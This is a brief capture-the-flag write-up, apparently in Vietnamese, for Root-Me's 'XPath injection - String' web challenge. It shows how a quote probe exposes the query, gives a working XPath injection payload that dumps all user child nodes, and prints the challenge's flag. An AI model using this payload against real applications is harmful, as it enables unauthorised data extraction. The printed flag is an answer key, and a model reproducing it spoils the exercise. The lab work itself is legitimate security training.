# [XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)

## Solutions

Nhập thử `'` vào trang search:

- `Error during search, invalid XPath syntax : //user/username[contains(., ''')]`
- => user input được đưa vào hàm contains

Nếu nhập `')] | //user/*[contains(*,'`:

- => `//user/username[contains(., '')] | //user/*[contains(*,'')]`
- Lấy được tất cả các child node của user, trong đó có flag

Flag: `MB5PRCvfOXiYejMcmNTI`

## References

- <https://www.educba.com/xpath-contains/>
